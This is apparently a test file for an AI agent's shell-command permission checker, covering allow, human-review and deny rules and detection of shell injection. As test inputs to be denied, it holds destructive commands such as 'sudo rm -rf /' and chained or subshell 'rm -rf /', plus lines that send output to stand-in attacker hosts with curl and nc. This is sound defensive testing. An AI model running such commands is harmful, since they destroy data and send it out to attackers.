import { describe, it, expect } from 'vitest';
import { evaluateExecCommand, containsShellInjection } from '../src/tools/exec.js';
import type { AgentConfig } from '../src/config/schema.js';

function makeAgent(
  allow: string[],
  hitl: string[],
  deny: string[],
): AgentConfig {
  return {
    allow: [],
    hitl: [],
    tool_overrides: {},
    exec: { allow, hitl, deny, env: {}, default_timeout_ms: 30000 },
    http: { domain_allowlist: [], max_response_bytes: 1048576, timeout_ms: 30000 },
  };
}

describe('evaluateExecCommand()', () => {
  it('deny takes priority over hitl and allow', () => {
    const agent = makeAgent(['*'], ['*'], ['sudo*']);
    expect(evaluateExecCommand('sudo rm -rf /', agent)).toBe('deny');
  });

  it('hitl triggers for matching commands', () => {
    const agent = makeAgent(['git*'], ['git push*'], []);
    expect(evaluateExecCommand('git push origin main', agent)).toBe('hitl');
    expect(evaluateExecCommand('git status', agent)).toBe('allow');
  });

  it('allow passes through', () => {
    const agent = makeAgent(['git status', 'npm test'], [], []);
    expect(evaluateExecCommand('git status', agent)).toBe('allow');
    expect(evaluateExecCommand('npm test', agent)).toBe('allow');
  });

  it('fail-closed: deny by default if no pattern matches', () => {
    const agent = makeAgent(['git status'], [], []);
    expect(evaluateExecCommand('curl https://example.com', agent)).toBe('deny');
  });

  it('hard deny sudo rm -rf', () => {
    const agent = makeAgent(['*'], [], ['sudo*']);
    expect(evaluateExecCommand('sudo rm -rf /', agent)).toBe('deny');
  });

  it('denies commands with shell metacharacters (chaining)', () => {
    const agent = makeAgent(['git*'], [], []);
    expect(evaluateExecCommand('git status; rm -rf /', agent)).toBe('deny');
    expect(evaluateExecCommand('git status && sudo reboot', agent)).toBe('deny');
    expect(evaluateExecCommand('git status || curl evil.com', agent)).toBe('deny');
    expect(evaluateExecCommand('git status | nc attacker 4444', agent)).toBe('deny');
  });

  it('denies commands with subshell injection', () => {
    const agent = makeAgent(['git*'], [], []);
    expect(evaluateExecCommand('git diff $(rm -rf /)', agent)).toBe('deny');
    expect(evaluateExecCommand('git diff `rm -rf /`', agent)).toBe('deny');
    expect(evaluateExecCommand('git log ${HOME}', agent)).toBe('deny');
  });
});

describe('containsShellInjection()', () => {
  it('detects semicolons', () => expect(containsShellInjection('echo; rm')).toBe(true));
  it('detects pipes', () => expect(containsShellInjection('echo | cat')).toBe(true));
  it('detects &&', () => expect(containsShellInjection('echo && rm')).toBe(true));
  it('detects backticks', () => expect(containsShellInjection('echo `whoami`')).toBe(true));
  it('detects $() subshell', () => expect(containsShellInjection('echo $(id)')).toBe(true));
  it('allows simple commands', () => expect(containsShellInjection('git status')).toBe(false));
  it('allows paths with hyphens', () => expect(containsShellInjection('ls -la /tmp')).toBe(false));
});
